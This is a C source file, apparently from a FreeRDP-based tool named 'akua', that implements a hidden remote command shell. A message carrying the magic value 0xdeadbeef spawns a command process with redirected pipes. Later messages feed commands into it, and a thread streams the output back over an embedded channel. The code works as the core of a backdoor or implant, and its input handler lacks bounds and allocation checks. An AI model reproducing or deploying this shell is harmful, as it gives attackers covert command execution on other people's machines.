#include "akua_config.h"

extern pipeHandles* createPipeWithMalloc();
extern PROCESS_INFORMATION* createCommandline(HANDLE in, HANDLE out);

volatile PROCESS_INFORMATION* cmdInstance;
volatile pipeHandles *pipeInput, *pipeOutput;
volatile HANDLE hThread;

DWORD WINAPI ReadFromCommandLineThread(LPVOID lpParam)
{
	char buffer[1000];
	DWORD dwRead;
	UINT8* outData;
	while (TRUE)
	{
		if (ReadFile(pipeOutput->readHandle, buffer, 999, &dwRead, NULL) && dwRead > 0)
		{
			buffer[dwRead] = '\0';
			outData = (UINT8*)malloc(dwRead + 2);
			if (outData == NULL)
				continue;
			PutUint16BE(dwRead, &outData[0], &outData[1]);
			memcpy(outData + 2, buffer, dwRead);
			PutDataToEmbedStream(outData, dwRead + 2, 0x04);
		}
	}
	return -1;
}

BOOL recvCmdReset(wStream* s)
{
	UINT32 magicCode1;
	Stream_Read_UINT32(s, magicCode1);
	if (magicCode1 != 0xdeadbeef)
	{
		return FALSE;
	}
	DWORD threadId;
	if (hThread != NULL)
		CloseHandle(hThread);
	if (pipeInput != NULL)
	{
		CloseHandle(pipeInput->readHandle);
		CloseHandle(pipeInput->writeHandle);
	}
	if (pipeOutput != NULL)
	{
		CloseHandle(pipeOutput->readHandle);
		CloseHandle(pipeOutput->writeHandle);
	}
	if (cmdInstance != NULL)
	{
		CloseHandle(cmdInstance->hProcess);
		CloseHandle(cmdInstance->hThread);
	}
	pipeInput = createPipeWithMalloc();
	pipeOutput = createPipeWithMalloc();
	cmdInstance = createCommandline(pipeInput->readHandle, pipeOutput->writeHandle);

	hThread = CreateThread(NULL, 0, ReadFromCommandLineThread, NULL, 0, &threadId);
	return TRUE;
}

BOOL recvCmdInput(wStream* s)
{
	UINT16 length;
	UINT8* data;
	Stream_Read_UINT16(s, length);
	data = (UINT8*)malloc(length);
	Stream_Read(s, data, length);
	DWORD dwWritten;
	if (!WriteFile(pipeInput->writeHandle, data, length, &dwWritten, NULL))
	{
		free(data);
		return FALSE;
	}
	free(data);
	return TRUE;
}

void akuaCmdProcess(wStream* s, BYTE* type)
{
	switch (*type)
	{
		case 0x21:
		{
			if (!recvCmdReset(s))
				goto seek_remaining;
			break;
		}
		case 0x27:
		{
			if (!recvCmdInput(s))
				goto seek_remaining;
			break;
		}
		default:
		{
		seek_remaining:
			WLog_ERR("akua", "seek remaining");
			Stream_Seek(s, Stream_GetRemainingLength(s));
			break;
		}
	}
}